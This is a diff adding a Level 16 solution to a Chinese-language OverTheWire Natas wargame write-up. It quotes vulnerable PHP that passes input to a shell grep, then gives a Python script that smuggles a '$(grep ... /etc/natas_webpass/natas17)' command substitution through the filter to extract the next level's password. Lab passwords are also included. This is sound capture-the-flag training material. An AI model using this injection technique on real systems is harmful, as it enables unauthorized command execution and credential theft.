@@ -407,3 +407,75 @@ print("".join(password))
 ```text
 WaIHEacj63wnNIBROHeqi3p9t0m5nhmh
 ```
+
+### Level16
+PHP源码
+```php
+<?
+$key = "";
+
+if(array_key_exists("needle", $_REQUEST)) {
+    $key = $_REQUEST["needle"];
+}
+
+if($key != "") {
+    if(preg_match('/[;|&`\'"]/',$key)) {
+        print "Input contains an illegal character!";
+    } else {
+        passthru("grep -i \"$key\" dictionary.txt");
+    }
+}
+?>
+```
+把大部分特殊字符都过滤了，不过\$key是包在双引号里的，所以可以用\$(statements)的方式来执行语句返回一个结果到$key里，其余的思路跟上一题差不多
+```python
+import string
+import urllib.request
+import urllib.parse
+
+url = "http://natas16.natas.labs.overthewire.org/index.php?debug=1"
+headers = {
+    "Authorization": (
+        "Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA=="
+    ),
+    "Host": "natas16.natas.labs.overthewire.org",
+}
+table =\
+    string.digits +\
+    string.ascii_uppercase +\
+    string.ascii_lowercase
+needle = '$(grep ^%s[%s] /etc/natas_webpass/natas17)'
+password = ""
+
+
+def check_password(low, high):
+    post_dict = {
+        "needle": needle % (password, table[low: high])
+    }
+    post_data = urllib.parse.urlencode(post_dict).encode('ascii')
+    req = urllib.request.Request(url, post_data, headers)
+    with urllib.request.urlopen(req) as f:
+        body = f.read().decode('utf-8')
+        return body.find("African") < 0
+
+
+while True:
+    low = 0
+    high = len(table)
+    mid = (low + high) // 2
+    while mid != low:
+        if check_password(mid, high):
+            low = mid
+        else:
+            high = mid
+        mid = (low + high) // 2
+    if check_password(low, high):
+        password += table[low]
+    else:
+        break
+print(password)
+```
+最后拿到natas17的密码
+```text
+8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
+```
